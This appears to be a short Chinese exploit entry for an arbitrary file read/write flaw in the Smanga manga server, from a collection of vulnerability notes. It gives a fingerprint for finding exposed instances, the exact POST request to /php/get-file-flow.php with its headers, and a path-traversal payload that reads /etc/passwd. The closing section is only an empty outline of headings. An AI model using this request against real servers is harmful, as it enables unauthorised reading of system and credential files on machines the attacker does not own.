# Smangaget-file-flow存在任意文件读取漏洞

- **系统**：Smangaget　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title=="smanga"`
- **请求**：`POST /php/get-file-flow.php HTTP/1.1`
- **关键头**：`Cookie: thinkphp_show_page_trace=00`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 39`

**请求体 / payload**
```
file=../../../../../../../../etc/passwd
```

**其他**
- Smanga get-file-flow存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Smanga